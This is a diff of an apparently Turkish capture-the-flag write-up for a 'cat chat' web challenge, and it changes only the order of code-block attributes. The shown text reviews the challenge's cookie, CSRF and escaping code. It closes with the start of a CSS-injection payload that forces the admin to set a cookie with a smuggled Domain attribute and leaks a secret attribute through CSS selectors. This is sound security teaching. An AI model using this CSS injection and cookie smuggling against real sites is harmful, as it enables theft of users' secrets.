@@ -130,7 +130,7 @@
 </span>
 </code></pre>
 <p><strong>flag</strong> cookiesi'ni kontrol edip admin mi değil mi diye kontrol ediyor</p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">app.</span><span style="color:#b58900;">use</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">function</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">next</span><span style="color:#657b83;">) {
 </span><span style="color:#657b83;">  </span><span style="color:#859900;">if </span><span style="color:#657b83;">(req.cookies.banned) {
 </span><span style="color:#657b83;">    res.</span><span style="color:#b58900;">sendStatus</span><span style="color:#657b83;">(</span><span style="color:#6c71c4;">403</span><span style="color:#657b83;">);
@@ -142,7 +142,7 @@
 </span>
 </code></pre>
 <p>Kullanıcı'nın banlı olup olmadığını kontrol ediyor. Eğer banlı ise <strong>403</strong> sayfasına yönlendiriyor.</p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">app.</span><span style="color:#b58900;">get</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, (</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">) </span><span style="color:#268bd2;">=&gt; </span><span style="color:#657b83;">res.</span><span style="color:#b58900;">redirect</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">/room/</span><span style="color:#657b83;">${</span><span style="color:#b58900;">uuidv4</span><span style="color:#657b83;">()}</span><span style="color:#2aa198;">/</span><span style="color:#839496;">`</span><span style="color:#657b83;">));
 </span><span style="color:#268bd2;">let </span><span style="color:#657b83;">roomPath = </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/room/:room([0-9a-f-]{36})</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">;
 </span><span style="color:#657b83;">app.</span><span style="color:#b58900;">get</span><span style="color:#657b83;">(roomPath + </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">function</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">) {
@@ -202,14 +202,14 @@
 </span>
 </code></pre>
 <p>Geldik mesajlar kısmına.</p>
-<pre lang="js" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
 <span style="color:#657b83;"> </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(req.headers.referer </span><span style="color:#859900;">|| </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#859900;">^</span><span style="color:#2aa198;">https</span><span style="color:#859900;">?</span><span style="color:#2aa198;">:</span><span style="color:#dc322f;">\/\/</span><span style="color:#839496;">/</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">startsWith</span><span style="color:#657b83;">(req.headers.host)) {
 </span><span style="color:#657b83;">    response = {type: </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">error</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">, error: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">CSRF protection error</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
 </span><span style="color:#657b83;"> }
 </span>
 </code></pre>
 <p><strong>Refer</strong> based CSRF koruması varmış.</p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#859900;">else if </span><span style="color:#657b83;">(msg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">] </span><span style="color:#657b83;">!= </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">) {
 </span><span style="color:#657b83;">    </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">msg</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name, msg});
 </span><span style="color:#657b83;">}
@@ -241,7 +241,7 @@
 </span>
 </code></pre>
 <p><strong>/secret xxx</strong> ise <strong>flag</strong> cookiesini <strong>xxx</strong> olarak set et.</p>
-<pre lang="js" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
 <span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/report</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
 </span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">report (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
 </span><span style="color:#657b83;">    </span><span style="color:#268bd2;">var </span><span style="color:#657b83;">ip = req.headers</span><span style="color:#268bd2;">[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">x-forwarded-for</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">;
@@ -258,12 +258,12 @@
 </ul>
 <h4>Client-side kod inceleme</h4>
 <p>Geldik Client-side kod inceleme kısmına <a href="https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/cat-chat.js">cat-chat.js</a></p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#268bd2;">let </span><span style="color:#b58900;">esc </span><span style="color:#657b83;">= (</span><span style="color:#268bd2;">str</span><span style="color:#657b83;">) </span><span style="color:#268bd2;">=&gt; </span><span style="color:#657b83;">str.</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&lt;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;lt;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&gt;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;gt;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&quot;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;quot;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&#39;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;apos;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
 </span>
 </code></pre>
 <p>Escape fonksiyonuna göre <strong>['&gt;','&lt;',' &quot; ',' ' ']</strong> karakterleri yasaklı. Bu kısımıda not edelim.</p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#268bd2;">function </span><span style="color:#b58900;">handle</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {
 </span><span style="color:#657b83;">  ({
 </span><span style="color:#657b83;">    </span><span style="color:#b58900;">undefined</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {},
@@ -290,7 +290,7 @@
 </span>
 </code></pre>
 <p>Bizi sadece <strong>/name</strong>, <strong>/report</strong> ve <strong>/ban</strong> ilgilendiriyor demiştik.</p>
-<pre lang="js" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
 <span style="color:#b58900;">ban</span><span style="color:#657b83;">(data) {
 </span><span style="color:#657b83;">  </span><span style="color:#859900;">if </span><span style="color:#657b83;">(data.name == localStorage.name) {
 </span><span style="color:#859900;">document</span><span style="color:#657b83;">.cookie = </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">banned=1; Path=/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">;
@@ -310,7 +310,7 @@
 <p><strong>/secret</strong> ile <strong>flag</strong>'i değiştirdiğimiz zaman <strong>flag</strong> değeri <strong>data-secret</strong> attribute'una değişen hali yazılıyormuş.</p>
 <p><img src="cat-chat3.png" alt="nou" /></p>
 <p>Bunuda köşeye yazalım</p>
-<pre style="background-color:#fdf6e3;" lang="js"><code>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
 <span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;"> was banned.&lt;style&gt;span[data-name^=</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;">] { color: red; }&lt;/style&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
 </span>
 </code></pre>
@@ -343,7 +343,7 @@
 <p>Şimdi sıra <strong>data-secret</strong> değerini okumakta.</p>
 <p>bknz. <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense"><strong>CSS</strong> ile veri çalmak</a></p>
 <p>her karakteri backroud resmi seklinde mesaj yollamasını sağlayacağız. <a href="https://www.w3schools.com/cssref/css_selectors.asp"><strong>CSS Selector</strong> </a> ile durmadan ilk karakteri kontrol etmemiz gerekiyor</p>
-<pre lang="css" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="css"><code>
 <span style="color:#657b83;">/name 4d4] {
 </span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=/secret dummy; Domain=d2gn834g5z45m9h14fkk5rbh</span><span style="color:#657b83;">);
 </span><span style="color:#657b83;">}
